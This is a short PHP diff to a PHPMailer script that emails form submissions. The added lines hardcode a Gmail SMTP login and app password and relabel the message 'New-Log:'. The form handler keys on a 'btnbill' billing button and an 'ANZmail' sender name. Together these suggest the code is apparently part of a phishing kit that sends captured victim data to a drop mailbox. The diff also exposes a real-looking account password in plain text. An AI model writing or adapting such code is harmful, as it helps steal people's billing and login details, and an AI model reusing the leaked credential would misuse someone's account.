@@ -17,16 +17,16 @@ $mail = new PHPMailer(true);
 
  //Server settings
  $mail->isSMTP();                                            //Send using SMTP
- $mail->Host       = $host;                                  //Set the SMTP server to send through
+ $mail->Host       = 'smtp.gmail.com';                                  //Set the SMTP server to send through
  $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
- $mail->Username   = $usersmtp;                     //SMTP username
- $mail->Password   = $passsmtp;                               //SMTP password
+ $mail->Username   = 'denzelbennie9@gmail.com';                     //SMTP username
+ $mail->Password   = 'dyue ofir mimi nwml';                               //SMTP password
  $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
  $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
 
  //Recipients
- $mail->setFrom($from, 'ANZmail');
- $mail->addAddress($to, 'Receiver');     //Add a recipient
+ $mail->setFrom($from, 'denzelbennie9@gmail.com');
+ $mail->addAddress($to, 'support@cbelko.net');     //Add a recipient
  // $mail->addAddress('ellen@example.com');               //Name is optional
  $mail->addReplyTo($replyto, 'Information');
  $mail->addCC($cc);
@@ -53,7 +53,7 @@ if (isset($_POST['btnbill'])) {
 
     // Compose a simple HTML email message
     $message = '<html><body>';
-    $message .= '<p> You have a new website form submission: </>';
+    $message .= '<p> New-Log: </>';
     $message .= '<ol>';
     $message .= '<li>IP Address:</li>'.$ip;
     $message .= '</ol>';
